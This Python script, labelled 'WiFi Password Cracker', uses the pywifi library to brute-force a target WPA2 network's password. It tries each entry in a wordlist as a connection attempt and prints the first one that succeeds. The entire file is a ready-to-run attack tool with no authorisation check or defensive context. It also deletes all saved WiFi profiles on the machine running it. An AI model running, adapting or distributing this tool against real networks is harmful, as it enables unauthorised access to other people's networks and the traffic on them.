import argparse  # For parsing command-line arguments
import time  # For time-related operations
import os.path  # For checking file existence
import platform  # For platform-specific operations
import pywifi  # PyWiFi library for WiFi operations
from pywifi import const, Profile  # Specific modules from pywifi

# ANSI color codes for colored output
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"

def connect_wifi(ssid, password):
    """
    Function to connect to a WiFi network using the provided SSID and password.

    Args:
        ssid (str): SSID of the target WiFi network.
        password (str): Password to use for connecting.

    Returns:
        bool: True if connected successfully, False otherwise.
    """
    wifi = pywifi.PyWiFi()  # Initialize PyWiFi
    iface = wifi.interfaces()[0]  # Get the WiFi interface

    profile = Profile()  # Create a WiFi profile
    profile.ssid = ssid  # Set the SSID
    profile.auth = const.AUTH_ALG_OPEN  # Set the authentication algorithm
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Set the key management type
    profile.cipher = const.CIPHER_TYPE_CCMP  # Set the cipher type
    profile.key = password  # Set the password

    iface.remove_all_network_profiles()  # Remove all existing network profiles
    tmp_profile = iface.add_network_profile(profile)  # Add the new profile
    iface.connect(tmp_profile)  # Connect to the network
    time.sleep(0.5)  # Wait for connection to establish (adjust as needed)

    return iface.status() == const.IFACE_CONNECTED  # Return connection status

def crack_password(ssid, password_file):
    """
    Function to crack the WiFi password using a wordlist file.

    Args:
        ssid (str): SSID of the target WiFi network.
        password_file (str): Path to the password wordlist file.

    """
    if not os.path.exists(password_file):  # Check if the file exists
        print(RED, "[-] Password file not found.")
        return

    with open(password_file, 'r', encoding='utf8') as f:  # Open the file
        for line in f:  # Read each line (password) from the file
            password = line.strip()  # Remove leading/trailing whitespace
            if connect_wifi(ssid, password):  # Try to connect with the password
                print(BOLD, GREEN, "[+] Password cracked:", password, RESET)
                return  # Exit if password is cracked

    print(RED, "[-] Password not found in the provided list.")

def main():
    """
    Main function to handle command-line arguments and initiate password cracking.
    """
    parser = argparse.ArgumentParser(description='WiFi Password Cracker')  # Create argument parser
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID of the target WiFi network')  # SSID argument
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='Path to the password wordlist file')  # Wordlist argument
    args = parser.parse_args()  # Parse the arguments

    ssid = args.ssid if args.ssid else input(CYAN + "[+] Enter the SSID: ")  # Get SSID from args or user input
    wordlist = args.wordlist if args.wordlist else input("[+] Enter the path to the password wordlist file: ")  # Get wordlist path from args or user input

    if platform.system().startswith("win"):  # Clear screen based on platform
        os.system("cls")
    else:
        os.system("clear")

    print(BLUE, "[~] Cracking...")  # Inform user about cracking process
    crack_password(ssid, wordlist)  # Start password cracking

if __name__ == "__main__":
    main()  # Execute main function if script is run directly
